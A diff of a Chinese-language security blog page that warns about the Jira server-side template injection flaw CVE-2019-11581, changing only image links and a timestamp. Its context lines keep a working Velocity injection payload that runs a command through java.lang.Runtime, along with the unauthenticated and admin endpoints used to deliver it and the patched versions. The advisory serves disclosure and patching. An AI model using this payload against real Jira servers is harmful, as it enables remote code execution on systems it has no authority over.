@@ -87,13 +87,13 @@
 <meta property="og:site_name" content="Poochi - Royal Never Give Up">
 <meta property="og:description" content="0x01漏洞背景Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。 JIRA官方发布安全通告修复了一个服务器端的模板注入漏洞（CVE-2019-11581），影响Jira Server和Jira Data Center。成功利用该漏洞的攻击者可以在受影响服务器上远程执行代码。使用Jira Cloud的用户不受影响。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ppdh0bx8j31jr0u0ti4.jpg">
-<meta property="og:image" content="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ppeld7y8j31oc0u0h7c.jpg">
-<meta property="og:updated_time" content="2019-11-08T11:28:38.000Z">
+<meta property="og:image" content="https://s2.loli.net/2023/03/23/Rc3g8AbDTnZjm4o.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/23/leqPmS5HxwVDnQj.png">
+<meta property="og:updated_time" content="2023-03-23T08:23:24.341Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Atlassian Jira 服务端模板注入漏洞预警">
 <meta name="twitter:description" content="0x01漏洞背景Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。 JIRA官方发布安全通告修复了一个服务器端的模板注入漏洞（CVE-2019-11581），影响Jira Server和Jira Data Center。成功利用该漏洞的攻击者可以在受影响服务器上远程执行代码。使用Jira Cloud的用户不受影响。">
-<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ppdh0bx8j31jr0u0ti4.jpg">
+<meta name="twitter:image" content="https://s2.loli.net/2023/03/23/Rc3g8AbDTnZjm4o.png">
 
 
 
@@ -394,10 +394,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set($v=&quot;s&quot;) $v.getClass().forName(&apos;java.lang.Runtime&apos;).getMethod(&apos;getRuntime&apos;,null).invoke(null,null).exec(&apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos;).waitFor()</span><br></pre></td></tr></table></figure>
 <h3 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h3><p>Jira服务端已配置好SMTP服务器，且“联系管理员表单”功能已开启(默认配置不开启)；</p>
 <p>在第一种情况下，“联系管理员表单”功能开启的情况下，攻击者可以未经任何认证，通过向 /secure/ContactAdministrators.jspa 发起请求利用此漏洞。</p>
-<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ppdh0bx8j31jr0u0ti4.jpg" alt></p>
+<p><img src="https://s2.loli.net/2023/03/23/Rc3g8AbDTnZjm4o.png" alt="image.png"></p>
 <h3 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h3><p>Jira服务端已配置好SMTP服务器，且攻击者具有”JIRA管理员”的访问权限。</p>
 <p>在第二种情况下，攻击者具有”JIRA 管理员”的访问权限下可通过 /secure/admin/SendBulkMail!default.jspa 利用此漏洞。</p>
-<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ppeld7y8j31oc0u0h7c.jpg" alt></p>
+<p><img src="https://s2.loli.net/2023/03/23/leqPmS5HxwVDnQj.png" alt="image.png"></p>
 <h1 id="0x04漏洞修复"><a href="#0x04漏洞修复" class="headerlink" title="0x04漏洞修复"></a>0x04漏洞修复</h1><p>升级到漏洞修复版本，如下：</p>
 <ul>
 <li>7.6.14</li>
